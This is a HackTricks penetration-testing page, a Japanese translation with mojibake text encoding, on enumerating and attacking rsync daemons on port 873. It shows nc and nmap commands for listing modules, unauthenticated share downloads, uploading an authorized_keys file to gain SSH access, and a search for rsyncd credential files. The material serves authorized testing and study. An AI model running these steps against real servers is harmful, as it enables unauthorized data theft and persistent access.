# 873 - Pentesting Rsync

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ**HackTricksã§ä¼šç¤¾ã®åºƒå‘Šã‚’æ²è¼‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ç‰ˆã®PEASSã‚’å…¥æ‰‹**ã—ãŸã‚Šã€**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã”è¦§ãã ã•ã„ã€‚
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã—ã¦ãã ã•ã„ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹ã‹**ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* [**hacktricksãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks)ã¨[**hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>

## **åŸºæœ¬æƒ…å ±**

> **rsync**ã¯ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã¨å¤–ä»˜ã‘ãƒãƒ¼ãƒ‰ãƒ‰ãƒ©ã‚¤ãƒ–ã€ã¾ãŸã¯[ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯åŒ–ã•ã‚ŒãŸ](https://en.wikipedia.org/wiki/Computer\_network) [ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿](https://en.wikipedia.org/wiki/Computer)é–“ã§[ãƒ•ã‚¡ã‚¤ãƒ«](https://en.wikipedia.org/wiki/Computer\_file)ã‚’åŠ¹ç‡çš„ã«[è»¢é€](https://en.wikipedia.org/wiki/File\_transfer)ãŠã‚ˆã³[åŒæœŸ](https://en.wikipedia.org/wiki/File\_synchronization)ã™ã‚‹ãŸã‚ã®ãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£ã§ã™ã€‚ã“ã‚Œã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ã®[å¤‰æ›´æ™‚é–“](https://en.wikipedia.org/wiki/Timestamping\_\(computing\))ã¨ã‚µã‚¤ã‚ºã‚’æ¯”è¼ƒã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦è¡Œã‚ã‚Œã¾ã™ã€‚[Unixç³»](https://en.wikipedia.org/wiki/Unix-like) [ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ](https://en.wikipedia.org/wiki/Operating\_system)ã§ä¸€èˆ¬çš„ã«è¦‹ã‚‰ã‚Œã¾ã™ã€‚rsyncã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã¯[ãƒ‡ãƒ«ã‚¿ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°](https://en.wikipedia.org/wiki/Delta\_encoding)ã®ä¸€ç¨®ã§ã‚ã‚Šã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä½¿ç”¨é‡ã‚’æœ€å°é™ã«æŠ‘ãˆã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚[Zlib](https://en.wikipedia.org/wiki/Zlib)ã¯è¿½åŠ ã®[ãƒ‡ãƒ¼ã‚¿åœ§ç¸®](https://en.wikipedia.org/wiki/Data\_compression)ã«ä½¿ç”¨ã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®ãŸã‚ã«[SSH](https://en.wikipedia.org/wiki/Secure\_Shell)ã¾ãŸã¯[stunnel](https://en.wikipedia.org/wiki/Stunnel)ãŒä½¿ç”¨ã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

[wikipedia](https://en.wikipedia.org/wiki/Rsync)ã‚ˆã‚Šã€‚

**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ãƒˆ:** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## åˆ—æŒ™

### ãƒãƒŠãƒ¼ & æ‰‹å‹•é€šä¿¡
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **å…±æœ‰ãƒ•ã‚©ãƒ«ãƒ€ã®åˆ—æŒ™**

**rsyncãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯åŸºæœ¬çš„ã«ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªå…±æœ‰ã§ã™**ã€‚ã“ã‚Œã‚‰ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯**ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã«ã‚ˆã‚‹ä¿è­·ãŒå¯èƒ½ã§ã™**ã€‚ã“ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯åˆ©ç”¨å¯èƒ½ãªãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ãƒªã‚¹ãƒˆã—ã€ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ãŒã‚¢ã‚¯ã‚»ã‚¹ã«ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’è¦æ±‚ã™ã‚‹ã‹ã©ã†ã‹ã‚’åˆ¤å®šã—ã¾ã™:
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

#Example using IPv6 and a different port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
å…±æœ‰åãŒãƒªã‚¹ãƒˆã«è¡¨ç¤ºã•ã‚Œãªã„ã‚ˆã†ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã—ãŸãŒã£ã¦ã€ä½•ã‹**éš ã•ã‚ŒãŸ**ã‚‚ã®ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
ã¾ãŸã€ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ï¼ˆç•°ãªã‚‹ï¼‰**ã‚¯ãƒ¬ãƒ‡ãƒ³ã‚·ãƒ£ãƒ«**ãŒå¿…è¦ãª**å…±æœ‰å**ãŒãƒªã‚¹ãƒˆã«è¡¨ç¤ºã•ã‚Œã¦ã„ã‚‹ã“ã¨ã«ã‚‚æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã—ãŸãŒã£ã¦ã€ãƒªã‚¹ãƒˆã•ã‚Œã¦ã„ã‚‹åå‰ãŒã™ã¹ã¦ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã¨ã¯é™ã‚‰ãšã€ãã®ä¸­ã®ã„ãã¤ã‹ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã‚ˆã†ã¨ã—ãŸã¨ãã« _**"ã‚¢ã‚¯ã‚»ã‚¹æ‹’å¦"**_ ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’å—ã‘å–ã£ãŸå ´åˆã«æ°—ã¥ãã§ã—ã‚‡ã†ã€‚

### [**ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**](../generic-methodologies-and-resources/brute-force.md#rsync)

### æ‰‹å‹• Rsync

**ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®ãƒªã‚¹ãƒˆ**ã‚’å–å¾—ã—ãŸã‚‰ã€å–ã‚ŠãŸã„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¨èªè¨¼ãŒå¿…è¦ã‹ã©ã†ã‹ã«å¿œã˜ã¦ã€ã„ãã¤ã‹ã®ç•°ãªã‚‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒã‚ã‚Šã¾ã™ã€‚**èªè¨¼ãŒä¸è¦ãªå ´åˆ**ã€å…±æœ‰ãƒ•ã‚©ãƒ«ãƒ€ã‚’**ãƒªã‚¹ãƒˆ**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
rsync -av --list-only rsync://192.168.0.123/shared_name
```
And **copy** all **files** to your local machine via the following command:

ãã—ã¦ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ã™ã¹ã¦ã®**files**ã‚’ãƒ­ãƒ¼ã‚«ãƒ«ãƒã‚·ãƒ³ã«**copy**ã—ã¾ã™ï¼š
```bash
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
ã“ã®**ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒã‚·ãƒ³`<IP>`ä¸Šã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒª`<shared_name>`ã‹ã‚‰ã™ã¹ã¦ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å†å¸°çš„ã«è»¢é€ã—**ã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒã‚·ãƒ³ä¸Šã®`./rsync_shared`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ä¿å­˜ã—ã¾ã™ã€‚ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã€Œã‚¢ãƒ¼ã‚«ã‚¤ãƒ–ã€ãƒ¢ãƒ¼ãƒ‰ã§è»¢é€ã•ã‚Œã€ã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯ã€ãƒ‡ãƒã‚¤ã‚¹ã€å±æ€§ã€æ¨©é™ã€æ‰€æœ‰æ¨©ãªã©ãŒè»¢é€ä¸­ã«ä¿æŒã•ã‚Œã¾ã™ã€‚

**è³‡æ ¼æƒ…å ±ã‚’æŒã£ã¦ã„ã‚‹å ´åˆ**ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦**å…±æœ‰åã‚’ãƒªã‚¹ãƒˆã‚¢ãƒƒãƒ—/ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã§ãã¾ã™ï¼ˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒæ±‚ã‚ã‚‰ã‚Œã¾ã™ï¼‰ï¼š
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
ã¾ãŸã€rsyncã‚’ä½¿ç”¨ã—ã¦**ã‚³ãƒ³ãƒ†ãƒ³ãƒ„**ã‚’**ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼ˆä¾‹ãˆã°ã€ã“ã®å ´åˆã¯_box_ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¾—ã‚‹ãŸã‚ã«_**authorized\_keys**_ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ï¼‰ï¼š
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

rsyncdè¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¦‹ã¤ã‘ã‚‹ï¼š
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
```markdown
è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã®ä¸­ã«ã¯ã€æ™‚ã€… _secrets file = /path/to/file_ ã¨ã„ã†ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãŒè¦‹ã¤ã‹ã‚‹ã“ã¨ãŒã‚ã‚Šã€ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯rsyncdã«èªè¨¼ã™ã‚‹ãŸã‚ã«è¨±å¯ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã®åºƒå‘Šã‚’æ²è¼‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ ã¾ãŸã¯ã€**æœ€æ–°ç‰ˆã®PEASSã‚’å…¥æ‰‹**ã—ãŸã‚Šã€**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã”è¦§ãã ã•ã„ã€‚
* [**å…¬å¼ã®PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* **[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã«ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€**[**hacktricksãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks)ã¨[**hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
```
